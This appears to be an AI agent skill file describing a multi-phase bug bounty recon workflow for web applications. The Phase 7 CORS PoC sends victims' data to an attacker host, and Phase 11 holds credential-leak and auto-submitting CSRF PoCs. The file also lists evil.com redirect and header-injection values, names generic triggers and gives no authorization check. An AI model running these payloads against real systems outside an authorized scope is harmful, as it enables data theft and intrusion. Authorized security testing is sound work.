---
name: web-recon-bugbounty
description: >
  Full-spectrum web application recon for bug bounty. Multi-phase passive/active
  scanning: DNS, subdomains, security headers, CSP, SRI, cookies, CORS, cache
  poisoning, JS source analysis, Next.js buildId extraction, internal API discovery.
  Outputs a structured findings report with severity ratings.
triggers:
  - "bug bounty"
  - "scan target for bugs"
  - "security recon"
  - "find vulnerabilities"
  - "cariin bug"
  - "cari bug"
  - "pentest web"
  - "recon domain"
tags:
  - security
  - recon
  - bug-bounty
  - web-security
  - penetration-testing
tools_used:
  - terminal (Python with requests, dnspython)
  - vision_analyze (screenshot analysis)
---

# Web Application Bug Bounty Recon

## Prerequisites
```bash
pip3 install dnspython requests
```

## Phase 1: DNS & Infrastructure
```python
import dns.resolver, socket
# A, AAAA, MX, NS, TXT, CNAME, SOA records
# DMARC, SPF checks
# Reverse DNS on resolved IPs
```

## Phase 2: Subdomain Enumeration
1. **crt.sh** — `https://crt.sh/?q=%.TARGET&output=json` (may timeout, use 15s)
2. **HackerTarget** — `https://api.hackertarget.com/reverseiplookup/?q=IP`
3. **Bruteforce** — Common subs: api, admin, sso, myxl, portal, care, store, mail, webmail, dev, staging, test, forum, rewards, corporate, enterprise, partner, m, img, video, dashboard, login, auth, monitoring, grafana, jenkins, gitlab, backup, old
4. **Shodan InternetDB** — `https://internetdb.shodan.io/IP` (free, no key)

## Phase 3: Security Headers Check
Check for MISSING:
- `Content-Security-Policy` — look for weak policies (only frame-ancestors, no script-src; unsafe-inline; unsafe-eval; connect-src *)
- `X-Content-Type-Options` (nosniff)
- `X-Frame-Options` (SAMEORIGIN/DENY)
- `Strict-Transport-Security` (max-age=31536000+)
- `Referrer-Policy`
- `Permissions-Policy`
- `Cross-Origin-Embedder-Policy` (COEP)
- `Cross-Origin-Opener-Policy` (COOP)
- `Cross-Origin-Resource-Policy` (CORP)

Check for DISCLOSED:
- `X-Powered-By` header (should be removed)
- `Server` header (info leak)
- `X-AspNet-Version`, `X-AspNetMvc-Version`

## Phase 4: Cookie Security
For each Set-Cookie, verify:
- `Secure` flag present
- `HttpOnly` flag present
- `SameSite` attribute set (Strict/Lax/None)
- Cookie name doesn't leak info (session, token, etc.)

## Phase 5: Sensitive Path Scan
```
/.env, /.git/HEAD, /.git/config
/wp-admin/, /wp-login.php, /wp-json/wp/v2/users
/api/, /graphql, /swagger-ui.html, /openapi.json, /api-docs
/phpinfo.php, /server-status, /server-info
/actuator, /actuator/health, /actuator/env
/debug, /config.json, /package.json, /composer.json
/.well-known/security.txt, /crossdomain.xml
/cdn-cgi/trace
```

## Phase 6: Open Redirect Testing
Test common redirect params: `ref`, `from`, `redirect`, `url`, `next`, `return`, `returnTo`, `continue`, `destination`, `redir`, `callback`, `goto`, `link`, `target`

For NextAuth apps: `/api/auth/signin?callbackUrl=https://evil.com`, `/api/auth/callback/credentials?callbackUrl=https://evil.com`

## Phase 7: CORS Misconfiguration
Send requests with Origin headers:
- `https://evil.com`
- `https://TARGET.evil.com`
- `null`
- `https://TARGET` (legitimate)

Check `Access-Control-Allow-Origin` response. If evil.com reflected → CORS bypass.

**Critical combination**: `Access-Control-Allow-Origin: https://evil.com` + `Access-Control-Allow-Credentials: true` = **HIGH severity**. Attacker can make authenticated cross-origin requests and steal user data.

**PoC for CORS data theft**:
```html
<script>
fetch('https://backend.target.com/api/dashboard', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  credentials: 'include',  // sends cookies!
  body: JSON.stringify({email: 'victim', api_token: 'stolen'})
}).then(r => r.json()).then(data => {
  // Send to attacker server
  fetch('https://attacker.com/steal?data=' + btoa(JSON.stringify(data)));
});
</script>
```

## Phase 8: Cache Poisoning / Header Injection
Test headers and compare response to baseline:
- `X-Forwarded-Host: evil.com`
- `X-Host: evil.com`
- `X-Original-URL: /admin`
- `X-Rewrite-URL: /admin`
- `X-Custom-IP-Authorization: 127.0.0.1`
- `X-Real-IP: 127.0.0.1`
- `X-Forwarded-For: 127.0.0.1`
- `Forwarded: host=evil.com`

**Important:** 200 OK with different hash ≠ vulnerability. Compare hash AND content. X-Original-URL/X-Rewrite-URL returning 403 (not 200) means server processes the header but blocks — not a bypass.

## Phase 9: JavaScript Source Analysis
Extract from page source:
- API endpoints (internal URLs, .xlaxiata.id, etc.)
- Environment variables (`process.env.*`, `NEXT_PUBLIC_*`, `REACT_APP_*`)
- Hardcoded keys/tokens (API keys, Firebase config, Stripe keys)
- Auth patterns (Bearer tokens, Basic auth, custom headers)
- **Backend URLs**: `grep -oP 'https?://backend\.[^\s"\\]*'` — often on different infra than frontend
- **Auth storage**: `grep -oP '(localStorage|sessionStorage)\.[a-zA-Z]+\([^)]*\)'` — find token storage keys
- **Data structures**: `grep -oP 'dashboardData\.[a-zA-Z_]+'` — map API response fields
- **Wallet/blockchain patterns**: `grep -oP '(wagmi|rainbow|metamask|walletconnect|ethers|web3|solana)[a-zA-Z0-9_./-]*'`

For Next.js apps: find `__NEXT_DATA__` script tag, extract `buildId`.

### Web3/Solana App Recon
When target uses Solana:
- Look for RPC endpoints: `api.devnet.solana.com`, `api.mainnet-beta.solana.com`, `api.testnet.solana.com`
- Extract program IDs: base58 strings of 32-44 chars
- Check for wallet adapter code: `@solana/wallet-adapter`, `Phantom`, `MetaMask`
- Auth often uses wallet signature + email combo
- API tokens may be UUIDs stored in localStorage

## Phase 10: Next.js Specific Checks
- **buildId exposure**: `/_next/data/{BUILD_ID}/*.json` — enumerate all SSG pages
- **Check for sensitive keys** in pageProps: token, apiKey, secret, msisdn, phone, balance, userId
- **Enumerate pages**: /myxl, /login, /admin, /dashboard, /packages, /promo, /rewards
- **JS chunks**: `/_next/static/chunks/*.js` — scan for endpoints, env vars, auth patterns

## Phase 11: HTTP Method Testing
Test: OPTIONS, TRACE, PUT, DELETE
- TRACE enabled = Cross-Site Tracing (XST)
- OPTIONS reveals allowed methods
- PUT/DELETE without auth = write access

### Login Form Method Check (CRITICAL)
Check if login forms use GET instead of POST — this leaks credentials in URLs:
```bash
# Fetch login page and check form method
curl -s "https://target/login" | grep -oP 'form[^>]*method="([^"]*)"'
# If method="get" → CRITICAL vulnerability!

# Also check the action URL
curl -s "https://target/login" | grep -oP 'action="([^"]*)"'
```

**Why this is CRITICAL:**
- Credentials appear in browser address bar
- Credentials saved in browser history
- Credentials logged by CDN (Cloudflare), server (Heroku), proxies
- Credentials leaked via Referer header to external sites
- Credentials visible to network monitoring tools

**PoC for credential theft via Referer:**
```html
<!-- Attacker page that steals credentials from Referer header -->
<img src="https://target/login_post?email=victim@email.com&password=plaintext" style="display:none">
<!-- If user clicks a link to attacker-site.com after login, Referer header contains credentials -->
```

**PoC for credential theft via CSRF:**
```html
<!-- Embed on any page - triggers login with attacker's credentials to log the victim's session -->
<form action="https://target/login_post" method="GET" id="steal">
  <input name="email" value="victim@email.com">
  <input name="password" value="stolen_password">
</form>
<script>document.getElementById('steal').submit();</script>
```

**Severity:** CRITICAL (CVSS 9.1) — Complete credential exposure

## Phase 12: Host Header Injection
Send requests with modified Host header:
- `evil.com`
- `TARGET:8080`
- `localhost`

Check if reflected in response or redirects.

## Severity Rating Guide
- **Critical**: RCE, SQLi, auth bypass, full account takeover
- **High**: XSS with data exfil, SSRF to internal, IDOR with PII, weak CSP with XSS
- **Medium**: Missing SRI, cookie issues, info disclosure (internal URLs), weak CSP (partial)
- **Low**: Tech disclosure (X-Powered-By), missing COEP/COOP/CORP, verbose errors

## Phase 13: SSL/TLS Analysis via NSE
```bash
# Full cipher enumeration + cert details
nmap -Pn --script "ssl-enum-ciphers,ssl-cert,ssl-date" TARGET -p 443 -T5 --max-retries 1 --host-timeout 20s

# Check for:
# - TLSv1.0/1.1 enabled (deprecated, SWEET32 vulnerable)
# - 3DES ciphers (Grade C)
# - Weak signature algorithms
# - Certificate validity and SAN entries
# - Missing OCSP stapling
```

**TLS Version Issues:**
- TLSv1.0/1.1 deprecated by RFC 8996 (2021)
- 3DES vulnerable to SWEET32 birthday attack
- Grade C or below = reportable finding

## Phase 14: CSP Infrastructure Fingerprinting
Parse `Content-Security-Policy` header for infrastructure clues:
```bash
curl -sI "https://target/" | grep -i "content-security-policy"
```

**Look for:**
- `chrome-extension://ID` — specific extension IDs reveal developer tools
- `*.blockmesh.xyz`, `*.vercel.app` — related projects/subsidiaries
- `r2-images.*`, `r2-assets.*` — Cloudflare R2 storage buckets
- `*.herokuapp.com` — backend hosting
- `*.hcaptcha.com`, `*.recaptcha.net` — bot protection type
- `*.cloudflareinsights.com` — analytics
- `*.googletagmanager.com` — tracking
- Wildcard `*.domain.com` in connect-src = broader attack surface

## Phase 15: PoC HTML Creation for Bug Bounty
When reporting vulnerabilities, create an interactive HTML PoC file:

```html
<!DOCTYPE html>
<html>
<head><title>PoC — [Vulnerability Name]</title></head>
<body>
<h1>Vulnerability: [Title]</h1>
<p>Target: https://target.com</p>

<h2>Test 1: [Description]</h2>
<button onclick="testVuln()">Run Test</button>
<div id="output"></div>

<script>
async function testVuln() {
    const output = document.getElementById('output');
    output.innerHTML = 'Testing...';
    
    try {
        const resp = await fetch('https://target/api/endpoint', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({test: true})
        });
        const data = await resp.text();
        output.innerHTML = `Response: ${data}`;
        
        // Highlight vulnerability
        if (data.includes('vulnerable_pattern')) {
            output.style.color = 'red';
            output.innerHTML += '\n🚨 VULNERABILITY CONFIRMED!';
        }
    } catch (err) {
        output.innerHTML = `Error: ${err.message}`;
    }
}
</script>
</body>
</html>
```

**PoC Best Practices:**
1. Self-contained — all tests in one HTML file
2. Interactive — buttons to trigger each test
3. Clear output — show results with color coding (red = vulnerable)
4. Professional — include target info, date, researcher name
5. Non-destructive — don't actually exploit, just demonstrate
6. Include remediation suggestions

## Common False Positives
- `X-Original-URL: /admin` → 403 means header IS processed but blocked (not a bypass)
- CORS returns 200 but no ACAO header = no CORS configured (not misconfigured)
- Next.js `__NEXT_DATA__` with empty pageProps = SSR, data loaded client-side
- Cloudflare 403 on /.env/.git = WAF blocking (not exposed)

## Pitfalls

### Login Form Method Vulnerability
Always check `<form method="">` on login pages. A shocking number of sites use `method="get"` which sends credentials as URL parameters. This is a CRITICAL finding that's easy to miss if you only check API endpoints. Look for:
- `<form action="/login_post" method="get">` — direct credential leak
- Forms that submit to external domains
- Forms without CSRF tokens
- Password fields without `type="password"`

### Nmap Behind Cloudflare
When scanning a site behind Cloudflare:
- All common ports (80, 443, 22, 21, 3306, etc.) will show **open** — this is Cloudflare's proxy, not the real server
- Nmap service detection will **timeout** because Cloudflare intercepts
- **Working flags**: `-Pn -T5 --max-retries 1 --host-timeout 20s` on specific ports only
- **SSL NSE works**: `ssl-enum-ciphers,ssl-cert` scripts work through Cloudflare
- **Solution**: Use web-based recon instead (curl, browser tools)
- To find the real origin IP: check MX records, SPF records, historical DNS (SecurityTrails), leaked IPs in JS/config files, `r2-assets.*` subdomains

### JS Bundle Backend Discovery
When the frontend is behind Cloudflare, the backend may be on a different host:
```bash
# Find backend URLs in JS bundle
curl -s "https://target/assets/*.js" | grep -oP 'https?://[a-zA-Z0-9._-]+target[a-zA-Z0-9._/-]*' | sort -u
# Common: backend.target.com, api.target.com, target.herokuapp.com
# Then scan the backend directly — it may not be behind Cloudflare
```

### Tech Stack Fingerprinting from Error Messages
- `"Failed to deserialize the JSON body into the target type"` → **Rust** (serde)
- `"Cannot GET /path"` → **Express.js**
- `"via: 2.0 heroku-router"` → **Heroku**
- `"server: cloudflare"` → **Cloudflare** (may hide origin)
- `"server: Vercel"` → **Vercel**
- `"server: AmazonS3"` → **AWS S3** static hosting
- `GAESA` cookie → **Google Cloud** (App Engine / Cloud Run)
- `__cf_bm` cookie → **Cloudflare Bot Management**

### Heroku-Specific Recon
When `via: 2.0 heroku-router` detected:
- Check `report-to` header for Heroku NEL endpoint (contains account info)
- Backend may NOT be behind Cloudflare (scan directly)
- Common pattern: frontend on Cloudflare, backend on Heroku
- Try `/api/*` paths — Heroku apps often have REST APIs
